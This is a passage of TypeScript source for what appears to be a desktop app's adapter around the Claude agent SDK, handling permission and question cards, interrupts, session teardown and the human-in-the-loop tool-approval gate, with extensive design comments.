  async respondPermission(id: string, decision: PermissionDecision): Promise<void> {
    const isSafeNegative = isAlwaysHonoured(decision.outcome)
    const offered = this.offeredDecisions.get(id)
    if (!isSafeNegative && offered && !offered.has(decision.outcome)) {
      throw new AnswerRefused(
        'not-offered',
        `decision '${decision.outcome}' is not offered by request ${id} ` +
          `(available: ${[...offered].join(', ')})`,
      )
    }
    if (!isSafeNegative && !CLAUDE_AVAILABLE_DECISIONS.includes(decision.outcome)) {
      throw new AnswerRefused(
        'not-offered',
        `decision '${decision.outcome}' is not one this adapter can honour ` +
          `(available: ${CLAUDE_AVAILABLE_DECISIONS.join(', ')})`,
      )
    }
    if (id.startsWith(ELICITATION_ID_PREFIX)) this.answeredByAPerson.add(id)
    if (!this.permissions.respond(id, decision)) {
      this.answeredByAPerson.delete(id)
      throw new AnswerRefused(
        'not-pending',
        `permission request ${id} is not pending (already answered, settled, or unknown)`,
      )
    }
  }

  /**
   * Answer an open question card — and decide HERE whether the answer can be forwarded (142 §1).
   *
   * ⛔ **The check is above the broker slot on purpose.** 139 put it in the `canUseTool`
   * continuation, which resumes after this method has already resolved; the host had nothing to
   * observe and recorded `answered` for an answer this adapter refused to state — *"the transcript
   * states a human answer was accepted when the adapter explicitly refused to tell it to the
   * provider"* (141 HIGH 1). Refusing before {@link RequestBroker.respond} means the request is
   * still pending when the caller learns it: nothing is written, the card comes back (085's
   * `noteFailure` puts the sentence on it and takes the in-flight guard off), and the user can
   * answer again — which is strictly better than the deny it used to send on their behalf.
   *
   * ⚑ **`not-usable` is therefore not a variant of `not-pending`.** The request is alive. The
   * message stays the adapter's diagnostic, naming the questions; the host says the sentence.
   */
  async respondUserInput(id: string, response: UserInputResponse): Promise<void> {
    const questions = this.askedQuestions.get(id)
    if (response.kind === 'answer' && questions) {
      const forward = answerToForward(questions, response.answers)
      if (!forward.forwardable) {
        throw new AnswerRefused(
          'not-usable',
          `user-input request ${id} cannot be forwarded to the provider (${forward.why})`,
        )
      }
      // ⚑ **728 · a server's form: the answer must also be the TYPES the server asked for.**
      const form = this.elicitationForms.get(id)
      const built = form === undefined ? null : elicitationContent(form, forward.values)
      if (built !== null && 'refusal' in built) {
        throw new AnswerRefused(
          'not-usable',
          `user-input request ${id} cannot be forwarded to the provider (${built.refusal})`,
        )
      }
    }
    // Read BEFORE the slot is filled, because filling it resolves the continuation that clears this
    // map. The continuation runs as a microtask rather than synchronously, so reading after would
    // work today and would be relying on scheduling to do it.
    const planGesture = this.planGestures.get(id)
    if (id.startsWith(ELICITATION_ID_PREFIX)) this.answeredByAPerson.add(id)
    if (!this.userInputs.respond(id, response)) {
      this.answeredByAPerson.delete(id)
      throw new AnswerRefused(
        'not-pending',
        `user-input request ${id} is not pending (already answered, settled, or unknown)`,
      )
    }
    // 🔴 **THE FLOOR MOVES HERE, and it is the only place it can** (150). See {@link PLAN_GESTURES}.
    //
    // ⛔ **In `respondUserInput` and NOT in the `canUseTool` continuation**, which is 139's lesson
    // read forwards instead of backwards. That continuation resumes *after* this method has already
    // resolved, so a host awaiting `respondUserInput` would observe the OLD plan mode and persist
    // it — the exact shape of 141 HIGH 1, where the transcript recorded an answer the adapter had
    // not yet acted on. Settling before this returns means that when the caller's await resolves,
    // the handle already says what it is: {@link RuntimeHost.respondUserInput} reads it straight
    // afterwards to write the durable half, and there is no window between the two.
    //
    // Only once the slot is genuinely filled: a refused or already-settled answer moves nothing,
    // because the card it left open is still answerable and its approval has not happened yet.
    if (planGesture !== undefined && response.kind === 'answer') this.plan.settle(planGesture)
  }

  /**
   * Interrupt the in-flight turn — and GUARANTEE it terminalizes (074, from the live stall).
   *
   * This used to fire `query.interrupt()` unbounded and rely on "the ensuing `result` still closes
   * the turn". That reasoning fails in exactly the case the user needs interrupt most: a provider
   * that has gone quiet. A stalled SDK may never ack the interrupt AND never send the `result`, so
   * `interrupt()` hung and the session stayed `working` forever — recoverable only by killing the
   * app. `close()` already had the right shape; this is that shape, without ending the session.
   *
   * The ack is bounded, and if the provider still has not terminalized the turn we force exactly
   * one `interrupted` terminal locally. The session stays usable — that is the whole point.
   *
   * ⛔ **It used to refuse outright when no turn was open, and that is the Stop button that did
   * nothing** (123, from 122 §11.2). For the four minutes `sess_6b4380fa` spent working outside a
   * turn — and for the whole of the out-of-turn CARD state, where 094 draws the button — this
   * returned on its first line. `PromptComposer.vue` had already written down what that costs: *"a
   * stop button that did nothing would be the one control on this surface that lies."*
   *
   * ⚠️ **A card with no work behind it is still something to stop**, and {@link settleRequests} is
   * the action: the agent stops waiting on an answer and the conversation is usable again. So the
   * guard asks whether there is anything to do, not whether there is a turn.
   *
   * 🔴 **695 · R35 — it stops the TURN, and it spares the background work** a person stops one by
   * one. The launch declares `perTaskStopAffordance` (see `optionsFor`), and the CLI then leaves
   * backgrounded agents and workflows running across this interrupt; background Bash it spared
   * already, declared or not. ⚑ Measured by `probe:per-task-stop` on CLI 2.1.281 — undeclared, the
   * agent ended `stopped` on the interrupt; declared, it stayed in the level and
   * {@link stopBackgroundWork} still ended it. ⛔ `close()` is not this: the child's exit takes every
   * task with it.
   */
  async interrupt(): Promise<void> {
    if (this.machine.isTerminal || !this.query) return
    if (!this.machine.hasProviderWork && this.machine.waiting === 0) return
    this.machine.requestInterrupt()
    // ⚑ **F084 — the Bash the turn is waiting on ends with the stop**: the CLI ends it (measured:
    // gone 106 ms after the stop, its card answered *"The user doesn't want to proceed…"*), and the
    // turn's ending says so. ⚠️ Background Bash is not among them: its call was answered as it was
    // sent to the background, and the CLI spares it. ⚑ Nor is a call still on its approval card,
    // which never ran: the stop refuses it below. ⚑ A turn the CLI started by itself (a wake) has
    // its own ending to say them on.
    const running = [...this.commandsWaitedOn].filter((id) => !this.permissions.has(id))
    if (running.length > 0) {
      this.machine.noteWhatTheStopEnded(this.machine.openTurnId ?? 'the-burst', running)
    }
    // Don't leave the turn's prompts hanging on interrupt — and 🔴 **695: say it was a STOP.** A
    // background agent the CLI now spares may be the one asking, and *"session closed"* would tell
    // a model that is still running that its conversation is gone.
    this.settleRequests(STOPPED_INSTEAD_OF_ANSWERING)
    try {
      await withTimeout(Promise.resolve(this.query.interrupt()), INTERRUPT_ACK_TIMEOUT_MS)
    } catch {
      // Best-effort: a provider that cannot even accept the interrupt must not block recovery.
    }
    // The provider may have terminalized during the ack; `forceEnd` is a no-op if it did.
    if (!this.machine.isTerminal) this.machine.forceEnd()
  }

  /**
   * Detach in-flight foreground work (247) — see {@link SessionHandle.backgroundWork}.
   *
   * ⛔ **`false`, never a throw, for the three ways this can have nothing to do**: the session is
   * over, the pinned query does not offer the method, or the id matched nothing running. All three
   * are the same sentence to a caller — *"there is no foreground work of yours to detach"* — and
   * `false` is the SDK's own word for the last of them.
   *
   * ⚠️ **Deliberately does NOT touch the session machine.** `interrupt` moves it because the turn is
   * ending; this leaves the turn running on purpose, so a state change here would report an ending
   * that is not happening. The visible consequence is the tool receipt and the level payload the
   * provider sends next, which the normalizer turns into `background_work` and a `backgrounded`
   * result — that is the whole feedback path, and it is the provider's, not ours.
   */
  async backgroundWork(toolCallId?: string): Promise<boolean> {
    if (this.machine.isTerminal || !this.query?.backgroundTasks) return false
    return await this.query.backgroundTasks(toolCallId)
  }

  /**
   * Stop one piece of background work (247) — see {@link SessionHandle.stopBackgroundWork}.
   *
   * ⚠️ Not a rejection on a shutting-down session or a query without the method, because there is
   * nothing left running to stop and a thrown error would make a closed session look broken. A stop
   * the PROVIDER refuses still rejects: that is a real answer and the caller should see it.
   *
   * ⛔ **`false` rather than SILENCE, and that is 287 finding 5.** Both no-ops used to return the
   * same `undefined` a successful stop returned, and `RuntimeHost.stopBackgroundWork` turned every
   * one of them into `true` — so the bar read *"Stopping… / Asked to stop"* over a request that was
   * never made. The boolean's own contract is *"the request went out"*, and here it did not.
   *
   * ⚠️ **`isShuttingDown` rather than `machine.isTerminal`**, because the window this finding is
   * about is an ordinary conversation CLOSE: `closing` is the state from the instant Close is
   * pressed, and it is not protected by the app-wide quit door. ⚑ Refusing there costs nothing that
   * was going to happen anyway: the detached work dies with the CLI child this teardown is closing,
   * which is `stopDetachedWork`'s own premise on the renderer side.
   *
   * ⛔ **{@link backgroundWork} one method up still reads `machine.isTerminal`, and that is left
   * alone deliberately** (287 scope). It is a MID-TURN gesture — *"stop waiting for this call"* —
   * offered while a turn is running, so the window `closing` opens is one it cannot be pressed in;
   * `280` found no defect there and widening it here would be a change with nothing measuring it.
   * The asymmetry is stated so the next reader sees a ruling rather than a miss.
   */
  async stopBackgroundWork(id: string): Promise<boolean> {
    if (this.isShuttingDown || !this.query?.stopTask) return false
    await this.query.stopTask(id)
    return true
  }

  /**
   * The teardown barrier (007 P1-1). Awaitable + idempotent: a second `close()`
   * is a no-op (the machine refuses a second `beginClose`). Ordering:
   * `closing` (rejects new sends) → safe-reject pending prompts → if a turn is
   * active, interrupt it and bounded-await the SDK ack, then force exactly one
   * terminal `turn:'interrupted'` → `Query.close()` so no further messages arrive
   * → the sole `session:'ended'`/`status:'ended'`. Past that point `terminated`
   * drops any late provider event.
   */
  close(): Promise<void> {
    // Single-flight: every concurrent caller awaits the SAME teardown promise, so
    // caller 2 never resolves before caller 1's provider teardown finishes (023 P1-A).
    // NOT `async` — an async wrapper would return a fresh promise per call, breaking
    // the memoized barrier.
    return (this.closing ??= this.doClose())
  }

  private async doClose(): Promise<void> {
    if (!this.machine.beginClose()) {
      // Already terminal (errored/closed): finishUnexpected/an earlier close already
      // emitted the terminal events — just ensure the provider resources are released.
      // ⛔ **And WAIT for the child** (202, 191 H3): a session that errored on its own still has a
      // CLI to reap, and this is the only path a quit takes to reach one.
      await this.detachQueryAwaitingExit()
      this.input.close()
      this.terminated = true
      this.eventQueue.close()
      return
    }
    this.settleRequests()
    // ⚠️ **An unbidden burst is torn down the same way a turn is** (123). A session being closed
    // while the provider works outside a turn used to skip the interrupt entirely and simply stop
    // reading, leaving the SDK to be reaped mid-thought.
    if (this.machine.hasProviderWork) {
      this.machine.requestInterrupt()
      if (this.query) {
        await withTimeout(Promise.resolve(this.query.interrupt()), CLOSE_INTERRUPT_TIMEOUT_MS)
      }
      // The provider may have terminalized during the ack; `forceEnd` is a no-op if it did.
      this.machine.forceEnd()
    }
    // ⛔ **The one line in this file that makes `close()` mean "the child is gone"** (202, 191 H3).
    // It used to be `detachQuery()` — a void `Query.close()` — and `RuntimeHost` registered the
    // promise this method returns as a launch's TERMINATION receipt, which therefore certified only
    // that BroBot had stopped holding the query.
    await this.detachQueryAwaitingExit()
    this.input.close()
    // Never synthesize a ref: a session that never got a validated `system/init`
    // has no honest identity to announce as ended (011). closeSession(null) then
    // emits only `status:'ended'`.
    //
    // 🔴 **722 · R79 — and the id this launch ASKED for is not a synthesized one** ({@link launch}).
    // ⚑ Announced only when the CLI's transcript under it names a folder, asked here — after the
    // exit receipt above, so the file is final (`717` step 10's CLI wrote its transcript 630 ms
    // AFTER the close was asked). The `session: 'ended'` it rides is the door the ledger writes `external_ref`
    // through (`session-store.ts`, `updateRef`), so the row, the archive this close takes
    // ({@link ref}) and the adoption scan's `findByProviderRef` name ONE conversation.
    // ⛔ `??=`: a ref a validated init latched always wins.
    this._ref ??= await this.launchRefIfRecorded()
    this.machine.closeSession(this._ref)
    this.terminated = true
    this.eventQueue.close()
  }

  // --- canUseTool (the human-in-the-loop gate) ---

  /**
   * The SDK's `canUseTool` callback. Command/file tools surface as
   * `permission_request` (stable id = `toolUseID`); the {@link USER_INPUT_TOOLS} — the model asking
   * the user something — as `user_input_request`. Resolution goes through the {@link RequestBroker}:
   * a request after close, a duplicate `toolUseID`, or an aborted signal is
   * safe-rejected (deny), never left pending. Map UI Deny → `{behavior:'deny'}`;
   * `cancel` → deny with `interrupt:true` and mark the turn interrupted.
   */
  async handleCanUseTool(
    toolName: string,
    input: Record<string, unknown>,
    options: ToolPermissionOptions,
  ): Promise<PermissionResult> {
    const id = options.toolUseID
    if (this.isShuttingDown) return { behavior: 'deny', message: 'session closed' }
    if (USER_INPUT_TOOLS.has(toolName)) {
      // …except the one this app answers for itself (056; in every mode since `736`). See
      // {@link CONSENT_ONLY_USER_INPUT}: this is the line that keeps widening the vocabulary from
      // quietly narrowing yolo, because every name added to USER_INPUT_TOOLS lands ABOVE the
      // auto-approve return below and would otherwise start blocking a session that was promised
      // it would never be asked.
      // 🔴 **736 · R98 — in EVERY mode, not only `auto`.** The CLI does not ask before the model's
      // own `EnterPlanMode` (measured, `probe:tool-calls-as-the-cli` `enter-plan-write`: with this
      // app's hook out, the CLI asked its host for the `Write` and never for `EnterPlanMode`). Until
      // `736` an `ask` conversation got a consent card of this app's own here — the only ask of
      // BroBot's the CLI does not make (`728` F-11).
      if (CONSENT_ONLY_USER_INPUT.has(toolName)) {
        // 🔴 **728 · and the conversation is planning from this allow** — the CLI enters its plan
        // mode on it (measured, `probe:tool-calls-as-the-cli` `enter-plan-write-auto`: it announces
        // `plan`, then asks before a `Write`). With nobody asked, it is settled here, or `auto` would
        // go on answering the plan mode's asks, and an `ask` card for a `Write` would offer a
        // conversation grant the plan-mode check never consults. 🔴 **740 · R99 (`736` F-8) — and
        // written down**: settled here, it is read off the handle by the host at the next event the
        // conversation delivers (`RuntimeHost.recordPlanPhase`). ⚑ **741 · R99 (corrected)** — a
        // reopen LEAVES it, as the interactive CLI's resume does (measured, `740`'s K7: back in its
        // default mode, and the model told *"You have exited plan mode"*, whoever started the plan).
        const gesture = PLAN_GESTURES.get(toolName)
        if (gesture !== undefined) this.plan.settle(gesture)
        return { behavior: 'allow' }
      }
      return this.handleUserInput(id, toolName, input, options)
    }

    // AUTO-APPROVE ends the permission path here (080, fixing 078).
    //
    // 080's comment said the SDK invokes `canUseTool` "regardless of `permissionMode`". That is not
    // true, and the correction matters (030 review): under `bypassPermissions` the SDK approves
    // every tool call, except explicit deny rules, before `canUseTool` is consulted, and only a
    // PreToolUse hook still gates every call.
    //
    // What 080 actually observed reconciles with that once the HOOKS are in the picture: at the
    // time, the PreToolUse guard was still installed in yolo, hooks run AHEAD of permission rules,
    // and a hook forcing `ask` routes the call through `canUseTool` — which is precisely what such
    // a hook is FOR. So the card came from the hook, not from the mode being
    // ignored. 080 fixed one half correctly (return here) and one half wrongly: dropping the guard
    // in yolo left an auto session with NOTHING that could re-arm prompting, which is what 050
    // repaired. The guard is installed in every query again — it yields in auto rather than being
    // absent. See {@link promptGuardHooks}.
    //
    // This return is therefore NOT dead code under a mode that shadows the callback — it is the
    // only thing suppressing the card in every mode that does NOT: `'default'`, which every Claude
    // session this app launches runs as (`permissionModeFor`). Removing it on the grounds that
    // `bypassPermissions` already auto-approves would silently start prompting a session the header
    // calls unattended. ⚠️ **It stands aside while planning, by design** (`728`, below): the CLI's own
    // plan mode asks even in its unattended mode, and that card is not an anomaly to "fix".
    //
    // Deliberately AFTER the `USER_INPUT_TOOLS` branch above: `AskUserQuestion`/`ExitPlanMode` are
    // the model asking the USER something, not a permission. Yolo skips permissions, and it cannot
    // invent an answer to a multiple-choice question — so a genuine question still surfaces.
    //
    // ⚠️ **That sentence used to be true only in the two modes named above, and 063 made it true
    // everywhere.** A session LAUNCHED in auto carries `bypassPermissions`, and that mode approves
    // every tool call before the callback is consulted — `AskUserQuestion` is a tool call, so the
    // question never reached the app at all, and the branch
    // above was unreachable in the one mode where it mattered most. This comment recorded it as an
    // open question ("inferred, not observed") and 061 finding 3 read it as the defect it was.
    //
    // It is closed from the hook, not from here: {@link promptGuardHooks} forces `ask` for
    // {@link USER_INPUT_TOOLS} BEFORE it consults the mode, so the callback is reached in every
    // mode and the branch above always runs. Nothing on this path changed — which is the point. The
    // classification stayed correct all along; what was missing was arriving at it.
    //
    // 🔴 **728 · R93 — …but NOT while planning: the CLI's own plan mode asks, even unattended.**
    // Measured (`probe:tool-calls-as-the-cli`, `plan-write-auto`): the bundled CLI in plan mode,
    // entered from a session that may skip permissions, still asks before a `Write`; outside plan
    // mode its skip-permissions asks nothing (`auto-*`, `.claude/`, `.git/` and `.vscode/` included).
    // Until `728` this app's plan floor refused such a call before it got here; with the floor gone,
    // answering it here would let a planning conversation write what the CLI would ask a person
    // about. So while planning the card is raised, as the CLI would raise it.
    if (isAutoApprove({ approvalMode: this.approvals.effective }) && !this.planning) {
      return { behavior: 'allow' }
    }

    const kind = FILE_TOOLS.has(toolName) ? 'file' : 'command'
    // Reserve the resolver slot BEFORE publishing the card (023 P1-B): a duplicate
    // `toolUseID`, a closing session, or an ALREADY-ABORTED request (052) is safe-denied
    // here with NO card — so it can never surface a second actionable card that would
    // resolve the FIRST request, nor a dead card for a request already refused.
    const reservation = this.permissions.reserve(id, options.signal)
    if (!reservation.accepted) {
      return { behavior: 'deny', message: 'duplicate, aborted, or closed permission request' }
    }
    const marks = askMarks(options)
    // 🔴 **728 · and no conversation grant for the CLI's own plan-mode ask** (`728`'s review). That
    // check answers `ask` BEFORE any allow rule is consulted, so a grant pressed here could not hold
    // while the plan stands — and it offers no "don't ask again" of its own: measured
    // (`probe:tool-calls-as-the-cli`), `plan-write` and `plan-mcp` came with no suggestions, where
    // `write`, `bash-rm`, `mcp` and `webfetch` came with one. ⚑ So the signal is the CLI's own: while
    // planning, an ask that carries a suggestion is an ordinary one, and keeps its grant.
    // ⚑ And none for this app's own tools: giving work, starting agents and the like stay a person's
    // choice each time, as on Codex.
    // The CLI's own choice for this ask, read once: what the card shows is what an answer installs.
    const row = cliRowOf(toolName, options, this.worksIn())
    const scope = claudeScope(
      this.cwd,
      toolName,
      input,
      marks.suppressAlwaysAllowRule === true ||
        (this.planning && !offersAStandingRule(options)) ||
        this.isThisAppsTool(toolName),
      row,
      this.alwaysRulesFile ?? undefined,
    )
    this.offeredDecisions.set(id, new Set(scope.availableDecisions))
    this.emit({
      type: 'permission_request',
      id,
      kind,
      action: toolName,
      // ⚑ 695 · R36 — the provider's own marks, carried so a surface can say why a grant is
      // missing and which answer is the default. The OFFER already obeys the first, above.
      ...marks,
      // 🔴 700 · `695` F-f — and the provider's own reason for them, when it gave one.
      ...providerReasonOf(options, marks),
      // ⚠️ **`options.title ?? …` used to be this line, and both halves of it were wrong** (071).
      // The fallback truncated; the `title` branch replaced the disclosure with a sentence, which
      // discloses less still — the SDK describes it as *"the primary prompt text"*, and a prompt is
      // not a grant. The two are separate fields now, and the disclosure is never the optional one.
      ...boundPermissionDetail(summarizeForDetail(toolName, input)),
      // A sentence longer than the whole ceiling is not a sentence; it is dropped rather than
      // truncated, because unlike the disclosure there is nothing here a fragment would still be
      // useful for. (Never yet observed at any length — see the measurement on the schema field.)
      ...(options.title !== undefined && options.title.length <= MAX_PERMISSION_DETAIL_CHARS
        ? { summary: options.title }
        : {}),
      scope: {
        ...scope,
        // RESOLVED, never raw: a blank disclosure that means "ask" is not a disclosure.
        approvalMode: isAutoApprove({ approvalMode: this.approvals.effective }) ? 'auto' : 'ask',
      },
    })
    // COUNTED, not toggled (063). The machine publishes `waiting_permission` only for the first open
    // card; a second one arriving while the first is unanswered changes the count and says nothing.
    this.machine.beginWait()

    const decision = await reservation.response
    this.offeredDecisions.delete(id) // settled: the offer is spent, and the map must not grow
    if (this.isShuttingDown) {
      // The count comes down; `working` does not go out. See {@link SessionMachine.abandonWait}.
      this.machine.abandonWait()
      return { behavior: 'deny', message: 'session closed' }
    }
    // `working` only if this was the LAST card. Answering one of two used to unblock the session.
    this.machine.endWait()

    switch (decision.outcome) {
      case 'allow':
        // ONE-SHOT, and it stays one-shot: no rules, no grant recorded, so the next call prompts.
        return decision.updatedInput
          ? { behavior: 'allow', updatedInput: decision.updatedInput }
          : { behavior: 'allow' }
      case 'allow_for_session': {
        // The two branches used to be the same line, returning a bare `{behavior:'allow'}` — so
        // "Approve for session" was a one-shot allow with a different label, and every subsequent
        // call re-asked. `updatedPermissions` was never constructed anywhere in the repo.
        //
        // 🔴 **736 · R94 — the rule IS the CLI's own** ({@link sessionGrantOf}): its suggestions for
        // THIS ask, held to the conversation. ⛔ Until `736` it was `728`'s rule of this app's own for
        // exactly the card's files — narrower than the CLI's (for a read, the CLI suggests the folder).
        // 🔴 **740 · R99 (`736` F-9) — and only what the interactive CLI's own choice installs**
        // ({@link cliRowOf}): for an `rm`, its folder — never the SDK's whole set.
        const updates = sessionGrantOf(row)
        // ⛔ Unreachable while the offer is gated on the same suggestions; a one-shot allow, never a
        // rule the CLI did not suggest, if it were ever reached.
        if (updates.length === 0) return { behavior: 'allow' }
        // ⚑ **A rule for the WHOLE tool is disclosed as one** — the header's list of wholesale
        // grants ({@link blanket}) — whichever button installed it (`736`'s review: the CLI's own
        // suggestion for an MCP tool is the whole tool).
        for (const whole of wholeToolsOf(updates)) this.sessionGrants.grantAll(whole)
        this.leavePlanIfTheModeDoes(updates)
        return {
          behavior: 'allow',
          updatedPermissions: updates,
          // `user_permanent` is the SDK's word for "the user chose not to be asked again", as
          // distinct from `user_temporary`, which is what a plain one-shot allow is.
          decisionClassification: 'user_permanent',
        }
      }
      case 'allow_always': {
        // 🔴 **736 · R95 / 740 · R99 — the CLI's own choice, with the persistence the CLI gives it,
        // kept where the CLI keeps it** — the project's local settings ({@link alwaysGrantOf}).
        const updates = alwaysGrantOf(row)
        if (!updates.some(keptByTheCli)) return { behavior: 'allow' }
        // ⚑ `740`'s review — a kept rule for the WHOLE tool (an MCP tool's) is also a whole-tool
        // grant for this conversation, and is disclosed as one, as the conversation button's is.
        for (const kept of wholeToolsOf(updates)) this.sessionGrants.grantAll(kept)
        this.leavePlanIfTheModeDoes(updates)
        return {
          behavior: 'allow',
          updatedPermissions: updates,
          decisionClassification: 'user_permanent',
        }
      }
      case 'allow_all_for_session': {
        // The wholesale grant (058): the CLI's own whole-tool session rule — since `728` the only
        // gate that could ask again is the CLI's, so this rule is the grant. `grantAll` records it
        // for the header's disclosure.
        //
        // ⚠️ **The SDK's `suggestions` are NOT echoed here** (058 review): for a shell command the
        // CLI suggests a command-PREFIX rule, narrower than what the button promised, so the first
        // command that did not match would raise a card after the person had been told nothing would
        // ask again. The rule installed is the plainest one that means what the label means: this
        // tool, this session. ⚠️ Not quite *"nothing will ask again"*: the CLI still asks its own
        // safety checks before any allow rule (`728`'s review) — the header's sentence is F-item.
        //
        // There is no `input` in this call for the same family of reason: passing it would invite
        // the next reader to scope the grant by it, and a grant scoped by arguments is
        // `allow_for_session` — a different button: since `736` (R94) the CLI's own rule, which an
        // under-disclosed card may offer beside this one ({@link claudeDecisionsFor}).
        this.sessionGrants.grantAll(toolName)
        return {
          behavior: 'allow',
          updatedPermissions: [
            { type: 'addRules', rules: [{ toolName }], behavior: 'allow', destination: 'session' },
          ],
          decisionClassification: 'user_permanent',
        }
      }
      case 'cancel':
        // ⚑ **736 · R97 — the Claude CLI's own Cancel, and nothing more.** Measured (`736`'s scratch
        // of the bundled CLI 2.1.281, interactive): Esc on a permission prompt, and its *No*, both
        // end the turn — *"Interrupted · What should Claude do instead?"*, no tool result sent to
        // the model. `interrupt: true` is how the SDK says that; the latch below records who asked.
        this.machine.requestInterrupt()
        return { behavior: 'deny', message: 'cancelled by user', interrupt: true }
      default:
        return { behavior: 'deny', message: decision.message ?? 'denied by user' }
    }
  }

  private async handleUserInput(
    id: string,
    toolName: string,
    input: Record<string, unknown>,
    options: ToolPermissionOptions,
  ): Promise<PermissionResult> {
    const questions = claudeQuestions(toolName, input)
    // ⚠️ **`AskUserQuestion` with nothing to ask is a malformed call, not a consent grant (064).**
    //
    // A card with no questions renders as a single enabled "Approve" — which is right for the plan
    // tools, whose input genuinely carries no choice, and wrong here. Pressing it returned a bare
    // `{ behavior: 'allow' }` with no `answers` at all, so the model's own question came back
    // successful and empty and it carried on as though it had been answered. That is 063's defect
    // wearing different clothes: a question the human never actually got to answer.
    //
    // Denied rather than repaired, and never published as a card, because the honest thing to tell
    // the model is that its call was malformed — which it can see and retry — rather than to invent
    // a human answer or to ask a human to approve a question that was never asked. It is the same
    // fail-closed rule the completeness check below already applies to a PARTIAL answer; zero
    // questions is the degenerate case of the same thing.
    if (toolName === 'AskUserQuestion' && questions.length === 0) {
      return { behavior: 'deny', message: 'AskUserQuestion carried no questions to ask' }
    }
    // ⛔ **Two questions with the SAME TEXT are two answers this provider cannot carry** (146, from
    // 145 HIGH 3). `AskUserQuestionOutput.answers` is a dictionary keyed by question text, and the
    // pinned SDK permits 1–4 questions with no uniqueness condition on it — so building that
    // dictionary for `["Anything else?" → "alpha", "Anything else?" → "beta"]` writes the second
    // over the first. One human answer destroyed on the way out, invisibly, with the card recorded
    // as `Answered`; and no second carrier, since `response` is deliberately absent whenever two
    // questions were answered freeform.
    //
    // ⚑ **Refused here rather than collapsed there**, which is the paragraph above applied to a
    // different malformation: the provider's shape cannot faithfully encode this call, so the
    // honest thing is to hand the model back a sentence it can act on rather than to show a human
    // two answerable questions and deliver one of the answers. **What the user sees is no card at
    // all** — exactly as for a call with no questions — and the model's own retry is what appears
    // next. 086's rule reads the same way from either end: never invent, and never quietly discard.
    const duplicate = duplicateAnswerKey(questions, (question) => question.prompt)
    if (toolName === 'AskUserQuestion' && duplicate !== null) {
      return {
        behavior: 'deny',
        message:
          `AskUserQuestion asked more than one question with the same text (${JSON.stringify(duplicate)}), ` +
          'and the answers are keyed by that text — ask each question in its own words',
      }
    }
    // ⛔ **An option nobody can click is the third way this call can be malformed** (150, 148 M6).
    // Same route and same reason as the two above — no card, and a sentence the model can act on.
    // See {@link unanswerableOptionLabel}: the labels themselves are never trimmed or filtered.
    const unanswerable = unanswerableOptionLabel(questions)
    if (toolName === 'AskUserQuestion' && unanswerable !== null) {
      return {
        behavior: 'deny',
        message:
          `AskUserQuestion offered an option whose label is blank (${JSON.stringify(unanswerable)}), ` +
          'and a blank option cannot be chosen — give every option a label with something in it',
      }
    }
    // Reserve before publishing (023 P1-B): a duplicate `toolUseID` / closing session
    // is safe-declined with NO card, never a second card that cross-authorizes the first.
    const reservation = this.userInputs.reserve(id, options.signal)
    if (!reservation.accepted) return { behavior: 'deny', message: 'declined by user' }
    // What this card asks, where the ANSWER path can reach it (142). Set after the reservation is
    // won and before the card goes out, so an answer can never arrive for a card whose questions
    // are not here yet — the same reserve-before-publish ordering, for the same reason.
    this.askedQuestions.set(id, questions)
    // …and, for the two cards that move plan mode, which way approving this one moves it (150).
    // Recorded here rather than re-derived in `respondUserInput` from a tool name that method never
    // sees: the answer path is handed an id and a response and nothing else.
    const planGesture = PLAN_GESTURES.get(toolName)
    if (planGesture !== undefined) this.planGestures.set(id, planGesture)
    // THE PLAN ITSELF, before the card that asks about it (030). Until now `input` was read for
    // questions and otherwise dropped, so `ExitPlanMode` surfaced as "approve this" with the
    // document it was about thrown away — the user asked to approve a plan they were never shown.
    //
    // Read defensively, and that is not paranoia: the pinned SDK's `ExitPlanModeInput` declares
    // only a deprecated `allowedPrompts` plus an `[k: string]: unknown` index signature — `plan` is
    // NOT in the type. It is real (every ExitPlanMode ever captured here carries it, and
    // `ExitPlanModeOutput.plan` names the same field), but nothing makes the compiler promise it,
    // so a missing or non-string one must produce NO document rather than an empty paper claiming a
    // plan exists — and the card then SAYS the plan is missing. See {@link planDocument} for what
    // 056 measured and why the file the provider also names is deliberately not opened.
    const plan = planDocument(toolName, input)
    if (plan) this.emit(this.todoPlan.document(plan))
    this.emit({
      type: 'user_input_request',
      id,
      prompt: userInputPrompt(toolName, options.title, plan !== ''),
      questions,
      // 🔴 **Which way approving this card moves the plan state, said on the card** (478).
      //
      // ⛔ **Off `planGesture` above and not off a second read of `toolName`.** It is the same
      // value `respondUserInput` acts on, so the sentence a person reads before pressing and the
      // transition the press performs cannot disagree — which is the whole of 214 §3 applied to a
      // promise rather than to a label. ⚠️ **Spread, and read {@link planConsentOf} for why a
      // present-but-`undefined` key broke the question channel.**
      ...planConsentOf(planGesture),
    })
    // WAITING ON THE USER IS NOT SILENCE (076). The permission path already brackets its await with
    // `waiting_permission` → `working`; this one did not, so the stall watchdog (074) and the
    // liveness tracker (075) counted the user's own thinking time as provider silence and pinged
    // "no activity for 120s" while an agent sat waiting for an answer to its own question.
    //
    // THE SAME LEASE AS THE PERMISSION PATH (063), not a second one: a question left open while a
    // permission card is answered must still hold the session in `waiting_permission`.
    this.machine.beginWait()

    const response = await reservation.response
    // Settled — by an answer, an abort, `settleAll`, or close. The request can no longer be answered
    // on ANY of those paths, so this is where the questions stop being needed (142). A refused
    // answer never gets here, which is exactly why the card it left open is still answerable.
    this.askedQuestions.delete(id)
    this.planGestures.delete(id)
    // Every exit below leaves `working` again — a status stuck on `waiting_permission` would be the
    // mirror bug: the watchdog disarmed for the rest of the turn. Unless another card is still open,
    // which is the whole point of counting them.
    if (this.isShuttingDown) {
      this.machine.abandonWait()
      return { behavior: 'deny', message: 'declined by user' }
    }
    this.machine.endWait()
    // Safe-decline (interrupt/reject) is a graceful deny — the turn continues. ⚑ A decline that
    // gives its reason is denied with that reason, which is what the model reads.
    if (response.kind !== 'answer') {
      const reason = response.reason?.trim() ?? ''
      return { behavior: 'deny', message: reason === '' ? 'declined by user' : reason }
    }
    if (toolName === 'AskUserQuestion') {
      // Completeness (033) and usability (139) in ONE call, and the same call that produces the
      // values (142 §3). What made `["the root", "   "]` reach the provider as `"the root,    "`
      // was that the guard filtered to COUNT and the payload joined the ORIGINAL: two readings of
      // one answer, only one of them checked. {@link answerToForward} returns what it approved, so
      // the payload cannot be built from anything else.
      //
      // ⚑ **Unreachable for an answer, and kept anyway.** {@link respondUserInput} refuses an
      // unforwardable answer before it can take the broker slot, and every other way this promise
      // settles produces `{kind:'reject'}` and left above — so no `deny` from here has a caller
      // today. It stays because it is not a second gate: it is the narrowing that hands back the
      // values, and deleting it would mean inventing a payload for a case that never arrives.
